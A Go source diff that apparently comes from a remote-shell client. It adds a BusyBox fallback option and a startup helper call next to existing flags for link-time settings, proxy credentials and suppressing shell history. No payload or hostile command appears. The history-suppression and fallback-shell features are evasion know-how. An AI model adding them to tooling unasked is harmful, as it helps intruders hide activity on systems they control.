@@ -63,6 +63,7 @@ var (
 	// golang can only embed strings using the compile time linker
 	useHostKerberos string
 	noHistorySave   string
+	busyBoxFallback string
 	logLevel        string
 
 	ntlmProxyCreds string
@@ -86,6 +87,7 @@ func printHelp() {
 	fmt.Println("\t\t--private-key-path\tOptional path to unencrypted SSH key to use for connecting")
 	fmt.Println("\t\t--connect-timeout\tDuration to wait for initial connection seconds, default 180, set to 0 to wait indefinitely")
 	fmt.Println("\t\t--no-history-save\tDetach startup and reduce shell history persistence for commands run through this client")
+	fmt.Println("\t\t--busybox-fallback\tUse embedded BusyBox on Linux when shell or command executables are missing")
 
 	if runtime.GOOS == "windows" {
 		fmt.Println("\t\t--use-kerberos\tUse kerberos authentication on proxy server (if proxy server specified)")
@@ -100,6 +102,7 @@ func makeInitialSettings() (*client.Settings, error) {
 		Addr:                 destination,
 		ProxyUseHostKerberos: useHostKerberos == "true",
 		NoHistorySave:        noHistorySave == "true",
+		BusyBoxFallback:      busyBoxFallback == "true",
 		SNI:                  customSNI,
 		VersionString:        versionString,
 	}
@@ -114,6 +117,9 @@ func makeInitialSettings() (*client.Settings, error) {
 }
 
 func main() {
+	if runExecassHelperIfRequested() {
+		return
+	}
 
 	settings, err := makeInitialSettings()
 	if err != nil {
@@ -223,6 +229,9 @@ func main() {
 	}
 	if line.IsSet("no-history-save") {
 		settings.NoHistorySave = true
+	}
+	if line.IsSet("busybox-fallback") {
+		settings.BusyBoxFallback = true
 	}
 
 	versionString, err := line.GetArgString("version-string")
